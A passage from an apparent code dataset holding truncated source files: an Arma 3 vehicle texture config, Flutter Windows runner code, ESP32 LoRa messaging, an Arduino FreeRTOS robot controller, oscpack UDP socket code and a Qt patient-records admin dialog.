\"rhsusf\\addons\\rhsusf_m1117\\data\\m1117_turret_co.paa\",\n                    \"rhsusf\\addons\\rhsusf_m1117\\data\\m1117_wheel_co.paa\",\n                    \"rhsusf\\addons\\rhsusf_hmmwv\\textures\\A2_parts_D_co.paa\",\n                    \"rhsusf\\addons\\rhsusf_m1a1\\duke\\data\\duke_antennae_d_co.paa\"\n                };\n                factions[] = {};\n            };\n            class Olive\n            {\n                displayName = \"OD\";\n                author = \"$STR_RHSUSF_AUTHOR_FULL\";\n                textures[] = {\n                    \"rhsusf\\addons\\rhsusf_m1117\\data\\M1117_tex1_OD_co.paa\",\n                    \"rhsusf\\addons\\rhsusf_m1117\\data\\M1117_armour_od_co.paa\",\n                    \"rhsusf\\addons\\rhsusf_m1117\\data\\M1117_turret_od_co.paa\",\n                    \"rhsusf\\addons\\rhsusf_m1117\\data\\m1117_wheel_green_co.paa\",\n                    \"rhsusf\\addons\\rhsusf_hmmwv\\textures\\A2_parts_g_co.paa\",\n                    \"rhsusf\\addons\\rhsusf_m1a1\\duke\\data\\duke_antennae_wd_co.paa\"\n                };\n                factions[] = {};\n            };\n            class un\n            {\n                displayName = \"UN\";\n                author = \"$STR_RHSUSF_AUTHOR_FULL\";\n                textures[] = {\n                    \"rhsusf\\addons\\rhsusf_m1117\\data\\m1117_tex1_un_co.paa\",\n                    \"rhsusf\\addons\\rhsusf_m1117\\data\\m1117_armour_un_co.paa\",\n                    \"rhsusf\\addons\\rhsusf_m1117\\data\\m1117_turret_un_co.paa\",\n                    \"rhsusf\\addons\\rhsusf_m1117\\data\\m1117_wheel_un_co.paa\",\n                    \"rhsusf\\addons\\rhsusf_hmmwv\\textures\\A2_parts_D_co.paa\",\n                    \"rhsusf\\addons\\rhsusf_m1a1\\duke\\data\\duke_antennae_d_co.paa\"\n                };\n                factions[] = {};\n            };\n            class Racs\n            {\n                displayName = \"RACS\"\n                author = \"PRACS Dev Team\"\n                textures[] = {\n                    \"m1117\\data\\mkk_m1117_racs_tex1_co.paa\",\n                    \"m1117\\data\\mkk_m1117_racs_armor_co.paa\",\n                    \"m1117\\data\\mkk_m1117_racs_turret_co.paa\",\n                    \"m1117\\data\\mkk_m1117_racs_tires_co.paa\",\n                    \"rhsusf\\addons\\rhsusf_hmmwv\\textures\\A2_parts_D_co.paa\",\n                    \"rhsusf\\addons\\rhsusf_m1a1\\duke\\data\\duke_antennae_d_co.paa\"\n                };\n                factions[] = {};\n            };\n        };\n    };\n};",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"firbase_application\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#define HELTEC_POWER_BUTTON // must be before \"#include <heltec_unofficial.h>\"\n#include \"heltec_unofficial.h\"\n#include \"esp32-hal.h\"\n#include \"messages.h\"\n#include <stdint.h>\n\n\n\n#define MAX_ITEMS 32\n#define MAX_READ_BYTES 100\n\n#define INTERVAL 2000\n#define MAX_TIMEOUT 8000\n\n// Frequency in MHz. Keep the decimal point to designate float.\n// Check your own rules and regulations to see what is legal where you are.\n#define FREQUENCY 866.3 // for Europe\n// #define FREQUENCY           905.2       // for US\n\n// LoRa bandwidth. Keep the decimal point to designate float.\n// Allowed values are 7.8, 10.4, 15.6, 20.8, 31.25, 41.7, 62.5, 125.0, 250.0 and 500.0 kHz.\n#define BANDWIDTH 250.0\n\n// Number from 5 to 12. Higher means slower but higher \"processor gain\",\n// meaning (in nutshell) longer range and more robust against interference.\n#define SPREADING_FACTOR 10\n\n// This value can be set anywhere between -9 dBm (0.125 mW) to 22 dBm (158 mW).\n// Note that the maximum ERP (which is what your antenna maximally radiates) on the\n// EU ISM band is 25 mW, and that transmissting without an antenna can damage your hardware.\n#define TRANSMIT_POWER 0\n\npayloaded_message *tx_queue[MAX_ITEMS];\nuint64_t message_counter = 0;\nunsigned long tx_time = 0;\nunsigned long last_rx = 0;\nunsigned long last_tx = 0;\n\nboolean rx_in_progress = false;\nvolatile boolean received = false;\nString rxString;\n\n//\n//\n// COMM  COMM  COMM  COMM  COMM  COMM  COMM  COMM  COMM  COMM  COMM  COMM  COMM  COMM  COMM  COMM  COMM  COMM  COMM  COMM  COMM  COMM  COMM\n//\n//\n\nvoid freePayloadedMessage(payloaded_message* payloaded_message) {\n  free(payloaded_message->command);\n  free(payloaded_message->payload);\n  free(payloaded_message);\n}\n\nvoid printBuffer(char* buffer, size_t start, size_t count) {\n    for (int i = start; i < start + count; i++) {\n        Serial.printf(\"%02X \", buffer[i]);\n    }\n}\n\nvoid rx()\n{\n  received = true;\n}\n\nvoid comm_setup()\n{\n  //memset(tx_queue, 0, sizeof(payloaded_message *) * MAX_ITEMS);\n  for (int i = 0; i < MAX_ITEMS; i ++) {\n    tx_queue[i] = NULL;\n  }\n\n  both.println(\"Radio init\");\n  RADIOLIB_OR_HALT(radio.begin());\n  // Set the callback function for received packets\n  radio.setDio1Action(rx);\n  // Set radio parameters\n  both.printf(\"Frequency: %.2f MHz\\n\", FREQUENCY);\n  RADIOLIB_OR_HALT(radio.setFrequency(FREQUENCY));\n  both.printf(\"Bandwidth: %.1f kHz\\n\", BANDWIDTH);\n  RADIOLIB_OR_HALT(radio.setBandwidth(BANDWIDTH));\n  both.printf(\"Spreading Factor: %i\\n\", SPREADING_FACTOR);\n  RADIOLIB_OR_HALT(radio.setSpreadingFactor(SPREADING_FACTOR));\n  both.printf(\"TX power: %i dBm\\n\", TRANSMIT_POWER);\n  RADIOLIB_OR_HALT(radio.setOutputPower(TRANSMIT_POWER));\n  // Start receiving\n  RADIOLIB_OR_HALT(radio.startReceive(RADIOLIB_SX126X_RX_TIMEOUT_INF));\n}\n\nvoid comm_enqueue_message(struct payloaded_message *message)\n{\n  message->seq_nr = message_counter;\n  message->last_sent = 0;\n  int enq_pos = message_counter % MAX_ITEMS;\n  Serial.printf(\"Enqueing at pos: %d\\n\", enq_pos);\n  tx_queue[enq_pos] = message;\n\n  message_counter++;\n  if (message_counter > INT16_MAX)\n    message_counter = 0;\n}\n\nint getMessageLen(payloaded_message* message) {\n  return strlen(message->command) + strlen(message->payload) + 10 + 4;\n}\n\nvoid transmit_message(payloaded_message *messages[], int size) {\n  int len = 0;\n  for (int i = 0; i < size; i++) {\n    len += getMessageLen(messages[i]);\n  }\n\n  char* combined_output = (char*) malloc(sizeof(char) * len+1);\n  memset(combined_output, 0, len);\n\n  for (int i = 0; i < size; i++) {\n    char output[getMessageLen(messages[i])];\n    sprintf(output, \"%s|%d|%s>\", messages[i]->command, messages[i]->seq_nr, messages[i]->payload);\n    strcat(combined_output, output);\n  }\n\n  printBuffer(combined_output, 0, strlen(combined_output)+1);\n\n  radio.clearDio1Action();\n  heltec_led(50);\n\n  tx_time = millis();\n  RADIOLIB(radio.transmit(combined_output));\n  tx_time = millis() - tx_time;\n  heltec_led(0);\n  if (_radiolib_status == RADIOLIB_ERR_NONE) {\n    both.printf(\"OK (%i ms)\\n\", (int)tx_time);\n  }\n  else {\n    both.printf(\"fail (%i)\\n\", _radiolib_status);\n  }\n  free(combined_output);\n  radio.setDio1Action(rx);\n  RADIOLIB_OR_HALT(radio.startReceive(RADIOLIB_SX126X_RX_TIMEOUT_INF));\n}\n\nvoid send_ack(uint8_t seqNr)\n{\n  Serial.printf(\"Sending ack for %d\\n\", seqNr);\n  payloaded_message *message = (payloaded_message *)malloc(sizeof(payloaded_message));\n  message->command = (char *) malloc(sizeof(char) * 4);\n  message->payload = (char *) malloc(sizeof(10));\n  strcpy(message->command, \"ACK\");\n  sprintf(message->payload, \"%d\", seqNr);\n\n  comm_enqueue_message(message);\n}\n\n// handle a received message. right now this is just removing messages from the queue if they were ACKed\nvoid handle_received_message(char* message_type, u_int8_t seq_nr, char* payload) {\n  if(strcmp(message_type, \"ACK\") == 0) {\n    Serial.printf(\"Got ACK Message for message %s\\n\", payload);\n    u_int8_t acked_seq_nr = atoi(payload);\n    for (int i = 0; i < MAX_ITEMS; i++) {      \n      if (tx_qu",
    "#include \"functions.h\"\n#include <Arduino.h>\n#include <PID_v1.h>\n#include <LiquidCrystal_I2C.h>\n#include <Arduino_FreeRTOS.h>\n\ndouble interval = 100000; //100ms\n\nvolatile long leftCount = 0;    //left encoder\nvolatile long rightCount = 0;   //right encoder\n\ndouble setPoint = 100;\ndouble leftInput, leftOutput;   //left motor\n\n//Specify the links and initial tuning parameters\ndouble Kp=2, Ki=5, Kd=1;\nPID leftPID(&leftInput, &leftOutput, &setPoint, Kp, Ki, Kd, DIRECT);\n\ndouble rightInput, rightOutput;   //right motor\nPID rightPID(&rightInput, &rightOutput, &setPoint, Kp, Ki, Kd, DIRECT);\n\nint machineEnergy = 100;  //initial energy level\nLiquidCrystal_I2C lcd(0x27,20,4);\n\n\n\nvoid task_checkForObjects(void* parameters){\n    for(;;){\n        long distance = readDistance();\n\n        if (distance < 30) {    //30cm\n            stopMotors();\n        }\n        vTaskDelay(100 / portTICK_PERIOD_MS);   //100ms\n    }\n    \n}\n\nvoid task_lineTrack(void* parameters){\n    for(;;){\n        int leftValue = analogRead(LEFTSENSOR);\n        int centerValue = analogRead(CenterSENSOR);\n        int rightValue = analogRead(RIGHTSENSOR);\n\n        if (centerValue > 500) { //center sensor On line\n            goForward();\n        }\n        else if (leftValue > 500) { //left sensor on line\n            turnLeft();\n        }\n        else if (rightValue > 500) { //right sensor on line\n            turnRight();\n        }\n        else { //stop\n            stopMotors();\n        }\n        vTaskDelay(100 / portTICK_PERIOD_MS);   //100ms\n    }\n    \n}\n\nvoid task_updateSpeed(void* parameters){\n    for(;;){\n        taskENTER_CRITICAL();\n        //calculate speed\n        leftInput = (leftCount * (1000.0 / (interval / 1000.0)));\n        rightInput = (rightCount * (1000.0 / (interval / 1000.0)));\n\n        //reset counts\n        leftCount = 0;\n        rightCount = 0;\n        taskEXIT_CRITICAL();\n\n        //compute pid\n        leftPID.Compute();\n        rightPID.Compute();\n\n        //change motors speed\n        analogWrite(ENB1, leftOutput);\n        analogWrite(ENB2, rightOutput);\n        vTaskDelay(100 / portTICK_PERIOD_MS);   //100ms\n\n    }\n    \n}\n\nvoid task_showEnergy(void* parameters){\n    for(;;){\n        decreaseEnergy();\n        if(machineEnergy <= 15){    // low charge\n            digitalWrite(ALERT_LED, HIGH);\n        }\n\n        //display energy on lcd\n        lcd.setCursor(0, 0);\n        lcd.print(\"Energy: \");\n        lcd.print(machineEnergy);\n        lcd.print(\"%\");\n        vTaskDelay(1000 / portTICK_PERIOD_MS);   //1000ms\n    }\n}\n\nvoid task_updateCarLight(void* parameters) {\n    for(;;){\n        float outsideLight = analogRead(LIGHT_SENSOR);\n        float carLightVoltage = 255 - fMap(outsideLight, 6, 679, 0, 255);\n        Serial.print(\"Outside Light: \");\n        Serial.println(outsideLight);\n        Serial.print(\"Car Light Voltage: \");\n        Serial.println(carLightVoltage);\n        analogWrite(CAR_LIGHT, carLightVoltage);\n        vTaskDelay(1000 / portTICK_PERIOD_MS);   //1000ms\n    }\n    \n}\n\n\nvoid setup() {\n    /****Motor drivers setup***/\n    pinMode(IN1, OUTPUT);\n    pinMode(IN2, OUTPUT);\n    pinMode(IN3, OUTPUT);\n    pinMode(IN4, OUTPUT);\n    pinMode(ENB1, OUTPUT);\n    pinMode(ENB2, OUTPUT);\n    pinMode(LIGHT_SENSOR, INPUT);\n    pinMode(CAR_LIGHT, OUTPUT);\n    analogWrite(ENB1, 255); // turn on\n    analogWrite(ENB2, 255); // turn on\n\n    /****Encoders setup****/\n    pinMode(LEFTENC, INPUT);\n    pinMode(RIGHTENC, INPUT);\n    attachInterrupt(digitalPinToInterrupt(LEFTENC), leftEncoderISR, RISING);\n    attachInterrupt(digitalPinToInterrupt(RIGHTENC), rightEncoderISR, RISING);\n\n    /****PID setup****/\n    leftPID.SetMode(AUTOMATIC);\n    leftPID.SetOutputLimits(0, 255);\n    rightPID.SetMode(AUTOMATIC);\n    rightPID.SetOutputLimits(0, 255);\n\n    /****IR Sensors setup****/\n    pinMode(LEFTSENSOR, INPUT);\n    pinMode(CenterSENSOR, INPUT);\n    pinMode(RIGHTSENSOR, INPUT);\n\n    pinMode(USONIC, OUTPUT);\n\n    pinMode(ALERT_LED, OUTPUT);\n\n    lcd.init();                     \n    lcd.backlight();\n\n    Serial.begin(9600);\n\n    xTaskCreate(\n        task_checkForObjects,\n        \"task check for objects\",\n        1000,\n        NULL,\n        5,\n        NULL\n    );\n    xTaskCreate(\n        task_lineTrack,\n        \"task line tracking\",\n        1000,\n        NULL,\n        4,\n        NULL\n    );\n    xTaskCreate(\n        task_updateCarLight,\n        \"task update car light\",\n        1000,\n        NULL,\n        3,\n        NULL\n    );\n    xTaskCreate(\n        task_updateSpeed,\n        \"task update speed\",\n        1000,\n        NULL,\n        2,\n        NULL\n    );\n    xTaskCreate(\n        task_showEnergy,\n        \"task show energy\",\n        1000,\n        NULL,\n        1,\n        NULL\n    );\n    \n}\n\nvoid leftEncoderISR() {\n    taskENTER_CRITICAL();\n    leftCount++;\n    taskEXIT_CRITICAL();\n}\n\nvoid rightEncoderISR() {\n    taskENTER_CRITICAL();\n    rightCount++;\n    taskEXIT_CRITICAL();\n}\n\nvoid goForward() {\n    digitalWrite(IN1, HIGH);\n    digitalWrite(IN2, LOW);\n    digi",
    "/*\r\n\toscpack -- Open Sound Control (OSC) packet manipulation library\r\n    http://www.rossbencina.com/code/oscpack\r\n\r\n    Copyright (c) 2004-2013 Ross Bencina <rossb@audiomulch.com>\r\n\r\n\tPermission is hereby granted, free of charge, to any person obtaining\r\n\ta copy of this software and associated documentation files\r\n\t(the \"Software\"), to deal in the Software without restriction,\r\n\tincluding without limitation the rights to use, copy, modify, merge,\r\n\tpublish, distribute, sublicense, and/or sell copies of the Software,\r\n\tand to permit persons to whom the Software is furnished to do so,\r\n\tsubject to the following conditions:\r\n\r\n\tThe above copyright notice and this permission notice shall be\r\n\tincluded in all copies or substantial portions of the Software.\r\n\r\n\tTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\r\n\tEXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\r\n\tMERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.\r\n\tIN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR\r\n\tANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF\r\n\tCONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION\r\n\tWITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\r\n*/\r\n\r\n/*\r\n\tThe text above constitutes the entire oscpack license; however, \r\n\tthe oscpack developer(s) also make the following non-binding requests:\r\n\r\n\tAny person wishing to distribute modifications to the Software is\r\n\trequested to send the modifications to the original developer so that\r\n\tthey can be incorporated into the canonical version. It is also \r\n\trequested that these non-binding requests be included whenever the\r\n\tabove license is reproduced.\r\n*/\r\n\r\n#include <winsock2.h>   // this must come first to prevent errors with MSVC7\r\n#include <windows.h>\r\n#include <mmsystem.h>   // for timeGetTime()\r\n\r\n#ifndef WINCE\r\n#include <signal.h>\r\n#endif\r\n\r\n#include <algorithm>\r\n#include <cassert>\r\n#include <cstring> // for memset\r\n#include <stdexcept>\r\n#include <vector>\r\n\r\n#include \"ip/UdpSocket.h\" // usually I'd include the module header first\r\n                          // but this is causing conflicts with BCB4 due to\r\n                          // std::size_t usage.\r\n\r\n#include \"ip/NetworkingUtils.h\"\r\n#include \"ip/PacketListener.h\"\r\n#include \"ip/TimerListener.h\"\r\n\r\n\r\ntypedef int socklen_t;\r\n\r\n\r\nstatic void SockaddrFromIpEndpointName( struct sockaddr_in& sockAddr, const IpEndpointName& endpoint )\r\n{\r\n    std::memset( (char *)&sockAddr, 0, sizeof(sockAddr ) );\r\n    sockAddr.sin_family = AF_INET;\r\n\r\n\tsockAddr.sin_addr.s_addr = \r\n\t\t(endpoint.address == IpEndpointName::ANY_ADDRESS)\r\n\t\t? INADDR_ANY\r\n\t\t: htonl( endpoint.address );\r\n\r\n\tsockAddr.sin_port =\r\n\t\t(endpoint.port == IpEndpointName::ANY_PORT)\r\n\t\t? (short)0\r\n\t\t: htons( (short)endpoint.port );\r\n}\r\n\r\n\r\nstatic IpEndpointName IpEndpointNameFromSockaddr( const struct sockaddr_in& sockAddr )\r\n{\r\n\treturn IpEndpointName( \r\n\t\t(sockAddr.sin_addr.s_addr == INADDR_ANY) \r\n\t\t\t? IpEndpointName::ANY_ADDRESS \r\n\t\t\t: ntohl( sockAddr.sin_addr.s_addr ),\r\n\t\t(sockAddr.sin_port == 0)\r\n\t\t\t? IpEndpointName::ANY_PORT\r\n\t\t\t: ntohs( sockAddr.sin_port )\r\n\t\t);\r\n}\r\n\r\n\r\nclass UdpSocket::Implementation{\r\n    NetworkInitializer networkInitializer_;\r\n\r\n\tbool isBound_;\r\n\tbool isConnected_;\r\n\r\n\tSOCKET socket_;\r\n\tstruct sockaddr_in connectedAddr_;\r\n\tstruct sockaddr_in sendToAddr_;\r\n\r\npublic:\r\n\r\n\tImplementation()\r\n\t\t: isBound_( false )\r\n\t\t, isConnected_( false )\r\n\t\t, socket_( INVALID_SOCKET )\r\n\t{\r\n\t\tif( (socket_ = socket( AF_INET, SOCK_DGRAM, 0 )) == INVALID_SOCKET ){\r\n            throw std::runtime_error(\"unable to create udp socket\\n\");\r\n        }\r\n\r\n\t\tstd::memset( &sendToAddr_, 0, sizeof(sendToAddr_) );\r\n        sendToAddr_.sin_family = AF_INET;\r\n\t}\r\n\r\n\t~Implementation()\r\n\t{\r\n\t\tif (socket_ != INVALID_SOCKET) closesocket(socket_);\r\n\t}\r\n\r\n\tvoid SetEnableBroadcast( bool enableBroadcast )\r\n\t{\r\n\t\tchar broadcast = (char)((enableBroadcast) ? 1 : 0); // char on win32\r\n\t\tsetsockopt(socket_, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));\r\n\t}\r\n\r\n\tvoid SetAllowReuse( bool allowReuse )\r\n\t{\r\n\t\t// Note: SO_REUSEADDR is non-deterministic for listening sockets on Win32. See MSDN article:\r\n\t\t// \"Using SO_REUSEADDR and SO_EXCLUSIVEADDRUSE\"\r\n\t\t// http://msdn.microsoft.com/en-us/library/ms740621%28VS.85%29.aspx\r\n\r\n\t\tchar reuseAddr = (char)((allowReuse) ? 1 : 0); // char on win32\r\n\t\tsetsockopt(socket_, SOL_SOCKET, SO_REUSEADDR, &reuseAddr, sizeof(reuseAddr));\r\n\t}\r\n\r\n\tIpEndpointName LocalEndpointFor( const IpEndpointName& remoteEndpoint ) const\r\n\t{\r\n\t\tassert( isBound_ );\r\n\r\n\t\t// first connect the socket to the remote server\r\n        \r\n        struct sockaddr_in connectSockAddr;\r\n\t\tSockaddrFromIpEndpointName( connectSockAddr, remoteEndpoint );\r\n       \r\n        if (connect(socket_, (struct sockaddr *)&connectSockAddr, sizeof(connectSockAddr)) < 0) {\r\n            throw std::runtime_error(\"unable to connect udp socket\\n\");\r\n        }\r\n\r\n        // get the address\r\n\r\n        struct sockaddr_in soc",
    "#include \"admin.h\"\r\n#include \"ui_admin.h\"\r\n#include <QTimer>\r\n#include <QStandardItemModel>\r\n\r\nadmin::admin(QWidget *parent, QList<QString>* Data, QList<QList<QString>>* recordData)\r\n    : QDialog(parent)\r\n    , ui(new Ui::admin)\r\n{\r\n    ui->setupUi(this);\r\n\r\n    QPixmap b1(\":/Images/admin.jpg\");\r\n    b1 = b1.scaled(ui->bglabel->size());\r\n    ui->bglabel->setPixmap(b1);\r\n    index = 0;\r\n    this->data_ptr = Data;\r\n    this->usersRecords_ptr = recordData;\r\n\r\n    QStringList headerLabels;\r\n    headerLabels << \"Name\" << \"ID\" << \"Role\";\r\n    ui->usersList->setColumnCount(3);\r\n    ui->usersList->setHorizontalHeaderLabels(headerLabels);\r\n\r\n\r\n    InitializeList();\r\n}\r\n\r\nadmin::~admin()\r\n{\r\n    delete ui;\r\n}\r\n\r\nvoid admin::on_pushButton_clicked()\r\n{\r\n    static_cast<logIn*>(parent())->show();\r\n    delete this;\r\n}\r\n\r\nvoid admin::on_DeleteRecordButton_clicked()\r\n{\r\n    QStandardItemModel* model = static_cast<QStandardItemModel*>(ui->PatientDetailsTable->model());\r\n    QString id = ui->PatientIDToBeDeleted->toPlainText();\r\n    for (int i = 0; i < ui->PatientDetailsTable->rowCount(); i++)\r\n    {\r\n        QModelIndex index = model->index(i,1);\r\n        QVariant data = model->data(index, Qt::DisplayRole);\r\n\r\n        if (id.trimmed() == data.toString().trimmed())\r\n        {\r\n            model->removeRow(i);\r\n            break;\r\n        }\r\n    }\r\n\r\n    int index = Find(id);\r\n    usersRecords_ptr->remove(index);\r\n\r\n    for (int i = 0; i < data_ptr->count(); i++)\r\n    {\r\n        QTextStream input(&(*data_ptr)[i]);\r\n\r\n        QString thisID;\r\n\r\n        input >> thisID >> thisID >> thisID >> thisID;\r\n\r\n        if (id.trimmed() == thisID)\r\n        {\r\n            data_ptr->remove(i);\r\n            return;\r\n        }\r\n    }\r\n    this->ui->DeleteRecordButton->setText(\"Invalid Details\");\r\n    QEventLoop loop;\r\n    QTimer::singleShot(1000, &loop, &QEventLoop::quit);\r\n    loop.exec();\r\n    this->ui->DeleteRecordButton->setText(\"Delete Record\");\r\n}\r\n\r\nvoid admin::InitializeList()\r\n{\r\n    QList<QString> data = *data_ptr;\r\n    for (int i = 0; i < data.count(); i++)\r\n    {\r\n        QTextStream input(&data[i]);\r\n        QString name, id, role;\r\n        input >> name >> role >> role >> id;\r\n        qDebug() << role;\r\n        if (role == \"admin\") continue;\r\n        int rowIndex = ui->usersList->rowCount();\r\n        ui->usersList->insertRow(rowIndex);\r\n        ui->usersList->setItem(rowIndex,0,new QTableWidgetItem(name));\r\n        ui->usersList->setItem(rowIndex,1,new QTableWidgetItem(id));\r\n        ui->usersList->setItem(rowIndex,2,new QTableWidgetItem(role));\r\n    }\r\n\r\n    ui->PatientDetailsTable->setColumnCount(3);\r\n    ui->PatientDetailsTable->setColumnWidth(0, 150);\r\n    ui->PatientDetailsTable->setColumnWidth(1, 50);\r\n    ui->PatientDetailsTable->setColumnWidth(2, 300);\r\n    QStringList headerLabels;\r\n    headerLabels << \"Name\" << \"ID\" << \"Diagnosis and Treatment\";\r\n    ui->PatientDetailsTable->setEditTriggers(QTableWidget::NoEditTriggers);\r\n    ui->PatientDetailsTable->setHorizontalHeaderLabels(headerLabels);\r\n\r\n    for (int i = 0; i < data.count(); i++)\r\n    {\r\n        QTextStream input(&data[i]);\r\n        QString name, role, id;\r\n\r\n        input >> name >> role >> role >> id;\r\n\r\n        if (role != \"patient\") continue;\r\n\r\n        AddPatientRecord(id);\r\n    }\r\n}\r\n\r\nQList<QString> admin::Retrieve(QString toBeFoundID)\r\n{\r\n    QList<QList<QString>> usersRecords = *usersRecords_ptr;\r\n    for (int i = 0; i < usersRecords.count(); i++)\r\n    {\r\n        QString userInfo = usersRecords[i][0];\r\n        QTextStream input(&userInfo);\r\n        QString id;\r\n        input >> id >> id;\r\n\r\n        if (id == toBeFoundID)\r\n        {\r\n            return (usersRecords[i]);\r\n        }\r\n    }\r\n}\r\n\r\nint admin::Find(QString toBeFoundID)\r\n{\r\n    QList<QList<QString>> usersRecords = *usersRecords_ptr;\r\n    for (int i = 0; i < usersRecords.count(); i++)\r\n    {\r\n        QString userInfo = usersRecords[i][0];\r\n        QTextStream input(&userInfo);\r\n        QString id;\r\n        input >> id >> id;\r\n\r\n        if (id == toBeFoundID)\r\n        {\r\n            return i;\r\n        }\r\n    }\r\n}\r\n\r\n\r\nvoid 